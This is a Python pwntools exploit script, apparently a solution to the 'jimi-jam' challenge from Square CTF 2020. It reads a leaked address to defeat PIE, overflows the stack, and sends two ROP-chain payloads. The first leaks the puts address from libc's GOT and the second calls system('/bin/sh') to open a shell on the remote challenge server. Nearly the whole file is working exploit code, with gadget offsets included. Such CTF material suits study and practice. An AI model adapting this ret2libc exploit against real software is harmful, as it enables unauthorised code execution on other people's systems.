# RazviOverflow
# Python3
'''
Hey there jimi jammer! Welcome to the jimmi jammiest jammerino!
The tour center is right here! 0x55bcff69b060
Hey there! You're now in JIMI JAM JAIL

Hey there jimi jammer! Welcome to the jimmi jammiest jammerino!
The tour center is right here! 0x55cb6c8e4060
Hey there! You're now in JIMI JAM JAIL

Hey there jimi jammer! Welcome to the jimmi jammiest jammerino!
The tour center is right here! 0x55c0a3ab1060
Hey there! You're now in JIMI JAM JAIL
'''

'''
ROPGADGET:
Binary:
0x00000000000013a3 : pop rdi ; ret
0x00000000000013a1 : pop rsi ; pop r15 ; ret
0x000000000000101a : ret


Library (libc): 

Strings information
============================================================
0x00000000001b75aa : /bin/sh
'''
from pwn import *

binary_static = ELF("./jimi-jam")
static_ropjail_address = binary_static.symbols[b'ROPJAIL']
static_vuln_address = binary_static.symbols[b'vuln']
static_plt_puts_address = 0x000010b0 # Hand copied, the PLT has some strange behavior.
static_got_puts_address = binary_static.got[b'puts']
static_pop_rdi_ret = 0x00000000000013a3
static_pop_rdx_pop_r15_ret = 0x00000000000013a1
static_ret = 0x000000000000101a

library_static = ELF("./libc.so.6")
library_static_puts_address = library_static.symbols[b'puts']
library_static_bin_sh_address = next(library_static.search(b'/bin/sh'))
library_static_execv_address = library_static.symbols[b'execv']
library_static_system_address = library_static.symbols[b'system']

print("ADDRESS OF SYSTEM -> " + str(hex(library_static_system_address)))

'''
LIBARY STATIC PUTS ADDRESS -> 0x875a0
LIBARY STATIC /bin/sh ADDRESS -> 0x1b75aa
LIBRARY STATIC EXECV ADDRES -> 0xe6450
LIBRARY STATIC SYSTEM ADDRES -> 0x55410
'''

offset_from_puts_to_bin_sh = library_static_bin_sh_address - library_static_puts_address
offset_from_puts_to_execv = library_static_execv_address - library_static_puts_address
offset_from_puts_to_system = library_static_system_address - library_static_puts_address # negative number

'''
Address of ropjail STATIC:16480
Address of vuln STATIC:4713
Address of plt puts 4144
Address of got puts 16288
'''


offset_from_ropjail_to_vuln = static_ropjail_address - static_vuln_address
offset_from_ropjail_to_plt_puts = static_ropjail_address - static_plt_puts_address
offset_from_ropjail_to_got_puts = static_ropjail_address - static_got_puts_address
offset_from_ropjail_to_pop_rdi_ret = static_ropjail_address - static_pop_rdi_ret
offset_from_ropjail_to_pop_rdx_pop_r15_ret = static_ropjail_address - static_pop_rdx_pop_r15_ret
offset_from_ropjail_to_ret = static_ropjail_address - static_ret

print("ROPJAIL -> " + str(hex(static_ropjail_address)))
print("OFFSET TO POP_RDI_RET -> " + str(hex(offset_from_ropjail_to_pop_rdi_ret)))


#binary = process("./jimi-jam")
binary = remote("challenges.2020.squarectf.com", 9000)
received = str(binary.recv())
print(received)
'''
Hey there jimi jammer! Welcome to the jimmi jammiest jammerino!
The tour center is right here! 0x561a7583b060
Hey there! You're now in JIMI JAM JAIL
'''
ropjail_dynamic_leaked_address = int(received.split("\\n")[1].split("!")[1].strip(),16)
print("LEAKED -> ["+ str(ropjail_dynamic_leaked_address) + "]")

dynamic_vuln_address = ropjail_dynamic_leaked_address - offset_from_ropjail_to_vuln
dynamic_plt_puts_address = ropjail_dynamic_leaked_address - offset_from_ropjail_to_plt_puts
dynamic_got_puts_address = ropjail_dynamic_leaked_address - offset_from_ropjail_to_got_puts

dynamic_pop_rdi_ret_address = ropjail_dynamic_leaked_address - offset_from_ropjail_to_pop_rdi_ret
dynamic_pop_rdx_pop_r15_ret_address = ropjail_dynamic_leaked_address - offset_from_ropjail_to_pop_rdx_pop_r15_ret
dynamic_ret_address = ropjail_dynamic_leaked_address - offset_from_ropjail_to_ret


# Vulnerable function performs a read of 0x40 at rbp-0x8

payload_0 = b"A" * 8 + b"B" * 8 + p64(dynamic_pop_rdi_ret_address) + p64(dynamic_got_puts_address) + p64(dynamic_plt_puts_address) + p64(dynamic_vuln_address)

print("[+] Sending first payload [+]")
binary.sendline(payload_0)
#received.split(b"\n")[0].strip().ljust(8, b"\x00")
received = binary.recv().split(b"\n")[0].strip().ljust(8, b"\x00")
dynamic_puts_address = u64(received)
dynamic_bin_sh_address = dynamic_puts_address + offset_from_puts_to_bin_sh
dynamic_execv_address = dynamic_puts_address + offset_from_puts_to_execv
dynamic_system_address = dynamic_puts_address + offset_from_puts_to_system

payload_1 = b"A" * 8 + b"B" * 8 + p64(dynamic_ret_address) + p64(dynamic_pop_rdi_ret_address) + p64(dynamic_bin_sh_address) + p64(dynamic_system_address)

binary.sendline(payload_1)

binary.interactive()
